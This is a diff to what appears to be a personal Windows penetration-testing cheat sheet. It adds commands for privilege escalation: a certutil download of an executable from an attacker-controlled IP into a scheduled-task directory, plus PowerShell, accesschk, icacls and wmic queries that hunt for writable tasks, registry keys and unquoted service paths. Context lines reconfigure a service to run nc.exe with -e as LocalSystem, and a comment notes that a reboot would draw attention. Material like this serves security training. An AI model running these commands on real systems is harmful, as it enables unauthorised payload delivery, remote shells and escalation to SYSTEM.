@@ -553,6 +553,12 @@ diff --color before after
 #for large files... watch them
 tcpdump -vnni tap0 tcp port 80
 
+
+###################################
+#### CERTUTIL DOWNLOAD    #########
+###################################
+certutil -urlcache -split -f "http://192.168.230.130:8080/something.exe" C:\ScheduledTasks\Task1\something.exe
+
 ###################################
 #### SIMPLE PHP UPLOAD       ######
 ###################################
@@ -672,7 +678,32 @@ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
 ####  SCHTASKS               ######
 ###################################
 schtasks /query /fo LIST /v
+schtasks /query /fo LIST /v 2>nul
 schtasks /create /tn "My App" /tr c:\apps\myapp.exe /sc once /st 14:18 /sd 11/13/2002
+
+#https://amonsec.net/2018/10/20/Common-Windows-Misconfiguration-Scheduled-Tasks.html
+
+Get-ScheduledTask
+
+#ignore default scheduled tasks
+Get-ScheduledTask | Select * | ? {$_.TaskPath -notlike "\Microsoft\Windows\*"} | Format-Table -Property State, Actions, Date, TaskPath, TaskName, @{Name="User";Expression={$_.Principal.userID}}
+
+#ignore tasks at your priv level
+Get-ScheduledTask | Select * | ? {($_.TaskPath -notlike "\Microsoft\Windows\*") -And ($_.Principal.UserId -notlike "*$env:UserName*")} | Format-Table -Property State, Actions, Date, Task
+Path, TaskName, @{Name="User";Expression={$_.Principal.userID}}
+
+#get task execution interval
+$task= Get-ScheduledTask -TaskName Task1
+ForEach ($triger in $task.Triggers) { echo $triger.Repetition.Interval}
+
+#get task actions
+$task= Get-ScheduledTask -TaskName Task1
+ForEach ($action in $task.Actions) { Select $action.Execute}
+
+accesschk64.exe -accepteula -wv <username> <path to task bin>
+
+
+
 
 ###################################
 ####   WEVTUTIL / WECUTIL    ######
@@ -1165,6 +1196,25 @@ sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32
 sc config upnphost obj= ".\LocalSystem" password= ""
 sc qc upnphost
 net start upnphost
+
+#check registry perms
+accesschk.exe -kvw <username> <reg_path>
+accesschk.exe -kvw <username> HKLM\SYSTEM\CurrentControlSet\Services\
+
+#look for unquoted services
+#Need: 1)a space char in path, 2) no quotes, 3) write perms to intermediate dir
+#Windows searchs for each term separated by a space
+#https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html
+wmic service get name,displayname,startmode,pathname | findstr /i /v "C:\Windows\\" |findstr /i /v """
+icacls <path>
+#^check perms
+
+#if user can modify service binary/binpath, but can't start/stop service, will need to reboot
+#^^^^^however reboot is loud AF
+
+
+
+
 
 ###################################
 #### SNIFFER                  ######
